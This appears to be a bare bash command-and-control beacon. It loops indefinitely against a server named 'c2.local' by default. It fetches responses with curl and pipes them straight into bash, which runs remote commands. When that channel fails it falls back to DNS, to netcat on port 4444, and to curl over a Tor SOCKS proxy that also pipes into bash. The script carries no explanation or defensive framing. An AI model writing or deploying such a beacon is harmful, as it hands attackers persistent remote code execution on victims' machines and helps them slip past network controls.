#!/bin/bash
S=${1:-"c2.local"}
while true; do
    curl -sk "https://$S/api/ping" 2>/dev/null | bash && continue
    dig +short "ping.$S" 2>/dev/null | grep -q . && continue
    echo ping | nc -w 3 $S 4444 2>/dev/null && continue
    curl -sk --socks5-hostname 127.0.0.1:9050 "https://$S/api/ping" 2>/dev/null | bash && continue
    sleep 300
done
